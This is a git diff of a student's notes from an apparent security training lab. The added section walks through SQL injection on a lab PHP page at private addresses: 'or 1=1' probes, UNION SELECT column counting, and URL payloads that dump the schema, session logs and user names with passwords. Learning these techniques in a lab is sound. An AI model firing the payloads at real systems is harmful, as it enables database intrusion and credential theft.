@@ -8,6 +8,9 @@ CTFD:
 http://10.50.20.30:8000/
 http://10.50.20.30:8000/challenges
 
+SQL INJECTION SITE
+10.50.29.140
+
 Cybbh:
 https://sec.cybbh.io/public/security/latest/index.html
 
@@ -1117,7 +1120,7 @@ Array
 select table_schema,table_name,column_name from information_schema.columns;
 ```
 
-## UNION.HTML (DEMO)
+## UNION.HTML POST METHOD (DEMO)
 
 1. Identify Vulnerable Field
 Interact normally to see how it works
@@ -1161,26 +1164,76 @@ pulls information from session.Tires on tireid,name,and size
 
 
 
+## UNION.HTML GET METHOD (DEMO) BLIND INJECTION
 
 
+Use the submnit bar to go to the query
+Use the URL BAR 
+
+http://10.50.29.140/uniondemo.php?Selection=1&Submit=Submit
+
+Delete back to the 1
+http://10.50.29.140/uniondemo.php?Selection=1
+
+Add truth statement to each of the SELECTIONS to see which is vulenrable 
+
+http://10.50.29.140/uniondemo.php?Selection=1 or 1=1
+
+http://10.50.29.140/uniondemo.php?Selection=2 or 1=1	VULNERABLE
+
+http://10.50.29.140/uniondemo.php?Selection=3 or 1=1	VULNERABLE
+
+http://10.50.29.140/uniondemo.php?Selection=4 or 1=1	VULNERABLE
 
 
+NOW see the amount of columns
+http://10.50.29.140/uniondemo.php?Selection=2 UNION SELECT 1,2,3
+Shows table like 132
+change position in golden statment
+UNION SELECT table_schema,table_name,column_name from information_schema.columns;
+UNION SELECT table_schema,column_name,table_name from information_schema.columns;
+
+NOW PASTE YOUR UNION SELECT INTO THE URL
+UNION SELECT table_schema,column_name,table_name from information_schema.columns;
+
+http://10.50.29.140/uniondemo.php?Selection=2%20UNION%20SELECT%20table_schema,column_name,table_name%20from%20information_schema.columns;
+
+NOW WE CAN SEND QUERIES INTO URL
+
+UNION SELECT sesion_id,user_id,status from session.session_log
+
+UNION SELECT id,name,pass from session.session_user
+
+## @@version
+
+shows database version
+
+Passing injection through the URL:
+
+After the .php?item=4 pass your UNION statement
 
 
+prices.php?item=4 UNION SELECT 1,2
 
 
+prices.php?item=4 UNION SELECT 1,2,@@version
 
 
+What is @@version?
 
 
+Abuse The Client (Enum)
+
+Identifying the schema leads to detailed queries to enumerate the DB
 
 
+Research Database Schemas and what information they provide
 
 
+php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
 
 
-
-
+What are information_schema and database()?
 
 
 
